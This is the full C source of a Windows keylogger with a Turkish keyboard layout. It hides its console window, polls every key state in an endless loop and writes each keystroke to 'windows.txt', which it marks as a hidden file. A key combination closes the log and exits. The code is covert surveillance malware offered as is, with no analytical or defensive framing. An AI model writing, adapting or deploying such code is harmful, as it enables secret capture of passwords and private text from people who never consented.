#include <stdio.h>
#include <windows.h>

void main()
{
	
	// HIDE WINDOWS
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, 0);
	
	int NUMLOCK,TAB,CAPSLOCK,L_SHIFT,R_SHIFT,L_CONTROL,R_CONTROL,R_WIN,L_WIN,L_ALT,R_ALT,SPACE,ENTER,BACKSPACE,CONTROL,ALT;
	
	int lastKey[255],isPress,press;
	
	char print;
	
	FILE* logger = fopen("windows.txt","a+");
	
	// HIDE windows.txt file
	int attr = GetFileAttributes("windows.txt");
	SetFileAttributes("windows.txt",attr+FILE_ATTRIBUTE_HIDDEN);
	
	
	//NECESSARY CHARACTERS FOR TURKISH KEYBOARD
	char chr1[]="=!'^+%&/()";
	char chr2[]={'}','>','£','#','$','½',' ','{','[',']'};
	char chr3[]={'þ','+',',','-','.','ö',0x22};
	char chr3_5[]="Þ+;_:Öé";
	char chr4_5[]="ÐÇÜÝ";
	char chr4[]="ðçüi";
	char chrNum[]="*+,-,/"; 


	for(press=0 ; press<255 ; press++)
		lastKey[press]=0;

		
	while(1)
	{
		Sleep(10);
		
		
		
		// for press Control
		NUMLOCK=		(GetKeyState(0x90)&0xFF)>0?1:0;
		TAB=			(GetKeyState(0x09)&0xFF00)>0?1:0;
		CAPSLOCK=		(GetKeyState(0x14)&0xFF00)>0?1:0;
		L_SHIFT=		(GetKeyState(0xA0)&0xFF00)>0?1:0;
		R_SHIFT=		(GetKeyState(0xA1)&0xFF00)>0?1:0;
		L_CONTROL=		(GetKeyState(0xA2)&0xFF00)>0?1:0;
		R_CONTROL=		(GetKeyState(0xA3)&0xFF00)>0?1:0;
		CONTROL=		(GetKeyState(0x11)&0xFF00)>0?1:0;
		L_ALT=			(GetKeyState(0xA4)&0xFF00)>0?1:0;
		R_ALT=			(GetKeyState(0xA5)&0xFF00)>0?1:0;
		ALT=			(GetKeyState(0x12)&0xFF00)>0?1:0;
		SPACE=			(GetKeyState(0x20)&0xFF00)>0?1:0;
		ENTER=			(GetKeyState(0x0D)&0xFF00)>0?1:0;
		BACKSPACE=		(GetKeyState(0x08)&0xFF00)>0?1:0;
		
		
		for(press=0 ; press<255 ; ++press)
		{
			isPress=(GetKeyState(press)&0xFF00)>0?1:0;
			
			
			if(isPress==1 && lastKey[press]==0)
			{
				
				
				if(ENTER==1)				fprintf(logger,"%s"," [ENTER]\n ");
					
				else if(TAB==1) 			fprintf(logger,"%s"," [TAB] ");
					
				else if(CAPSLOCK==1) 		fprintf(logger,"%s"," [CAPSLOCK] ");
					
				else if(SPACE==1) 			fprintf(logger,"%s"," ");
			
				else if(BACKSPACE==1)		fprintf(logger,"%s"," [BACKSPACE] ");
				
				// Alphabet
				else if(press>='A' && press<='Z')
				{
					if(L_SHIFT==1 ||R_SHIFT==1 || CAPSLOCK==1)
					{
						print=(char)(press);
						fprintf(logger,"%c",print);
					}
				
					else
					{
							if((L_ALT==1 && L_CONTROL==1)||R_ALT==1)
							{
								if(press==0x41)
										fprintf(logger,"%c",'æ');
								else if(press==0x45)
										fprintf(logger,"%c",'€');
								else if(press==0x49)
										fprintf(logger,"%c",'i');
								else if(press==0x51)
										fprintf(logger,"%c",0x40);
								else if(press==0x53)
										fprintf(logger,"%c",'ß');
								else if(press==0x54)
										fprintf(logger,"%c",'?');
								else if(press==0x59)	
								{
									fclose(logger);
									exit(EXIT_SUCCESS);
								}
							}
							
							else
							{
									print=(char)(press+32);
									fprintf(logger,"%c",print);	
							}
							
					}
						
					
				}		
				
			
			
			
				//Num-Characters, Numbers and ALT_GR NUM CHAR.
				else if(press>='0' && press<='9')
				{
					if(L_SHIFT == 1 || R_SHIFT == 1)
					{
							print=chr1[press-'0'];
							fprintf(logger,"%c",print);
					}
					else if((L_CONTROL == 1 && L_ALT == 1) || R_ALT == 1)
					{
						fprintf(logger,"%c",chr2[press-0x30]);		
					}
					else   	fprintf(logger,"%d",press-'0');
						
				}
				
				
				
				//NUMLOCK NUMBERS	
				else if(press >= 0x60 && press <= 0x69 && NUMLOCK == 1)
				{
					fprintf(logger,"%c",(char)(press-0x30));
				}
				
				
				
				
				//NUMPAD CONTROLLER
				else if(press >= 0x6A && press <= 0x6F && NUMLOCK == 1)
					fprintf(logger,"%c",chrNum[press-0x6A]);
				
				
				
				
				
				
				// chr3 && chr3_5
				else if(press >= 0xBA && press <= 0xC0)
				{
					if(L_SHIFT == 1 || R_SHIFT == 1)
					{
						print=chr3_5[press-0xBA];
						fprintf(logger,"%c",print);
					}
					else if((L_ALT == 1 && L_CONTROL == 1)|| R_ALT == 1)
					{
						if(press == 0xBD)
							fprintf(logger,"%c",'|');
					}
					else
					{
						print=(char)chr3[press-0xBA];
						fprintf(logger,"%c",print);
					}
					
				}
				
			
			
			
			
			
				// chr4 && chr4_5
				else if(press >= 0xDB && press <= 0xDE)
				{
					if(L_SHIFT == 1 || R_SHIFT == 1)
						fprintf(logger,"%c",chr4_5[press-0xDB]);
					else if((L_ALT == 1 && L_CONTROL == 1)|| R_ALT == 1)
					{
						if(press == 0xDB)
							fprintf(logger,"%c",'¨');
						else if(press == 0xDD)
							fprintf(logger,"%c",'~');
					}
					else
						fprintf(logger,"%c",chr4[press-0xDB]);
				}
				
				
			
						
			
			}
			
			lastKey[press] = isPress;
		}
		
		
	}
	fclose(logger);
}
